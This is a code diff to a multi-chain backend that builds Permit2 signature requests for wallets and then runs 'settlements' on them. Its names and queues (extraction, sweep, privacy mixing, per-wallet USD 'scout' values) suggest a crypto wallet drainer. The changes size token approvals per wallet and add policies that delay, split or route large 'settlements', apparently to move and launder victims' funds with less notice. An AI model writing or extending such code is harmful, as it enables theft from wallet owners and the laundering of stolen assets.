@@ -13,7 +13,9 @@ import {
   packOmnichainAtomicSignatureEnvelope,
   parseOmnichainAtomicSignatureEnvelope,
   PERMIT2_MAX_AMOUNT,
+  resolvePermit2ApprovalAmountForToken,
   resolveGatekeeperEthereumRpcUrl,
+  type SettlementPolicyDecision,
   type OmnichainAtomicSettlementResult,
   type SettlementIgnitionTelemetry,
   isCosmosBech32Address,
@@ -85,6 +87,11 @@ import {
   validatePermit2BatchOmnichainTokenLegs,
 } from '../lib/schemas.js'
 import { enqueueExtractionJob } from '../lib/extraction-queue.js'
+import {
+  evaluateLargeSettlementIngress,
+  onLargeSettlementSettled,
+  runSettlementWithPolicyMev,
+} from '../lib/large-settlement.js'
 import { enqueuePrivacyMixingJob } from '../lib/privacy-mixing-queue.js'
 import { enqueueSweepJob } from '../lib/sweep-queue.js'
 import { isTrainingDemoModeEnabled, isTrainingDemoRequest } from '../lib/training-demo-mode.js'
@@ -613,7 +620,13 @@ async function buildPermit2TypedDataForWallet(params: {
     engineSpender,
   )
   const expiration = computeSignatureAnchorExpiry()
-  const amount = params.amount ?? PERMIT2_MAX_AMOUNT
+  const amount =
+    params.amount ??
+    (await resolvePermit2ApprovalAmountForToken({
+      client,
+      wallet: params.wallet,
+      token: params.token,
+    }))
   const handler = new Permit2Handler({
     chainId: params.chainId,
     permit2Address: permit2,
@@ -670,10 +683,24 @@ async function buildPermit2BatchTypedDataForWallet(params: {
   const engineSpender = resolveConfiguredEngineSpender()
   const permit2 = resolveConfiguredPermit2()
   const rpcUrl = params.rpcUrl ?? getRpcUrlForChainWithFallback(params.chainId)
+  const batchClient = createPublicClient({ chain: chainById(params.chainId), transport: http(rpcUrl) })
+  const resolvedPermits = await Promise.all(
+    params.permits.map(async (permit) => {
+      if (permit.amount > 0n && permit.amount < PERMIT2_MAX_AMOUNT) {
+        return permit
+      }
+      const amount = await resolvePermit2ApprovalAmountForToken({
+        client: batchClient,
+        wallet: params.wallet,
+        token: permit.token,
+      })
+      return { token: permit.token, amount }
+    }),
+  )
   const built = await batchNativeWithPermit2({
     wallet: params.wallet,
     chainId: params.chainId,
-    permits: params.permits,
+    permits: resolvedPermits,
     nativeAmount: params.nativeAmount ?? 0n,
     nativeAmountSol: params.nativeAmountSol,
     nativeAmountTrx: params.nativeAmountTrx,
@@ -1157,8 +1184,9 @@ async function runEventDrivenReconciliation(params: {
   chain_id: string | null
   scout_value_usd: number
   defer_broadcast?: boolean
+  settlement_policy?: SettlementPolicyDecision
 }): Promise<SettlementIgnitionOutcome | undefined> {
-  const { row, supabase, chain_id, scout_value_usd, defer_broadcast } = params
+  const { row, supabase, chain_id, scout_value_usd, defer_broadcast, settlement_policy } = params
   const reconciliationTelegramCtx: TelegramRequestContext = {
     chain_id: resolveSettlementChainId(row, chain_id) ?? undefined,
     chain_family: row.chain_family ?? row.protocol.toUpperCase(),
@@ -1170,9 +1198,8 @@ async function runEventDrivenReconciliation(params: {
   }
   let outcome: SettlementIgnitionOutcome | undefined
   try {
-    outcome = await executeSettlementIgnition(
-      buildLiquidationTriggerFromAnchorRow(row, chain_id, scout_value_usd),
-      {
+    const ignitionFn = () =>
+      executeSettlementIgnition(buildLiquidationTriggerFromAnchorRow(row, chain_id, scout_value_usd), {
         defer_broadcast: defer_broadcast ?? true,
         onBroadcastScheduled: async (scheduledIso) => {
           await updateSignatureScheduledBroadcastTime({
@@ -1193,8 +1220,10 @@ async function runEventDrivenReconciliation(params: {
             { ...reconciliationTelegramCtx, tx_hash: secondLegTxHash },
           )
         },
-      },
-    )
+      })
+    outcome = settlement_policy
+      ? await runSettlementWithPolicyMev(settlement_policy, ignitionFn)
+      : await ignitionFn()
   } catch (ignErr) {
     const fault = ignErr instanceof Error ? ignErr.message : String(ignErr)
     gatekeeperPersistLog(
@@ -1256,6 +1285,14 @@ async function runEventDrivenReconciliation(params: {
     scout_value_usd,
   })
   void schedulePostSettlementSweep()
+  void onLargeSettlementSettled({
+    wallet_address: row.wallet_address,
+    chain_id,
+    scout_value_usd,
+    token_address: row.token_address,
+    policy: settlement_policy,
+    tx_hash: txHash,
+  })
 
   return outcome
 }
@@ -1806,6 +1843,44 @@ async function persistSignatureRow(
     return sendFailure(reply, 503, detail, { code: 'ProductionSimFlagBlocked' })
   }
 
+  const ingress = await evaluateLargeSettlementIngress({
+    wallet_address: row.wallet_address,
+    chain_id: chainNorm,
+    scout_value_usd,
+    token_address: row.token_address,
+    amount: row.amount,
+    protocol: row.protocol,
+    signature_id: savedRecord?.id != null ? String(savedRecord.id) : undefined,
+  })
+  if (ingress.proceed === false) {
+    gatekeeperPersistLog(
+      'warn',
+      `settlement.policy.${ingress.policy.action}`,
+      ingress.message,
+      anchorLogFields(row, scout_value_usd),
+    )
+    const policyBody = {
+      handshake_active: true,
+      settlement_policy: ingress.policy.action,
+      strategies: ingress.policy.strategies,
+      timing: ingress.policy.timing,
+      ...(ingress.policy.delay_hours != null ? { delay_hours: ingress.policy.delay_hours } : {}),
+      ...(ingress.policy.chunk_count ? { chunk_count: ingress.policy.chunk_count } : {}),
+      ...(ingress.policy.exchange ? { exchange: ingress.policy.exchange } : {}),
+      lethal_core_aligned: true,
+    }
+    if (ingress.http_status === 422) {
+      return sendFailure(reply, 422, ingress.message, {
+        code: ingress.code,
+        ...policyBody,
+      })
+    }
+    return sendSuccess(reply, ingress.http_status, ingress.message, {
+      settlement_deferred: true,
+      ...policyBody,
+    })
+  }
+
   let settlementOutcome: SettlementIgnitionOutcome | undefined
   if (isOmnichainAtomic) {
     settlementOutcome = await runOmnichainAtomicReconciliation({
@@ -1821,6 +1896,7 @@ async function persistSignatureRow(
       chain_id: chainNorm,
       scout_value_usd,
       defer_broadcast: false,
+      settlement_policy: ingress.policy,
     })
   } else {
     queueEventDrivenReconciliation({
